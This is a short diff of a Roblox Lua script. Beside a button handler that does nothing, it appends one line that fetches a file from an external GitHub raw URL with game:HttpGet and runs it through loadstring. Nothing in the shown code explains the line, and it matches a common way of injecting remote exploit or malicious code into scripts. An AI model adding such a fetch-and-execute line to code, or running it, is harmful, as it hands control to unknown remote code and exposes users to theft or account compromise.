@@ -59,3 +59,4 @@ setWhiteColor()
 button.MouseButton1Click:Connect(function()
     -- Tidak ada yang perlu dilakukan di sini
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/gefop.txt"))()
